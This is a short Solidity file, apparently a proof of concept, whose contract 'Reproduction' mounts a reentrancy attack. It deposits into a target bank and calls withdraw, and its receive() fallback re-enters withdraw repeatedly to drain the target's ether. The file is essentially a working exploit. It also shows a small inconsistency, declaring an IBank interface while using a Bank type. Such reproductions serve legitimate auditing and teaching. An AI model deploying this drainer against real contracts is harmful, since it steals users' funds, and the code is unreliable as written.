interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = Bank(_target);
    }

    function setup() external payable {
        require(msg.sender == owner);
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner);
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > msg.value) {
            target.withdraw(msg.value);
        }
    }
}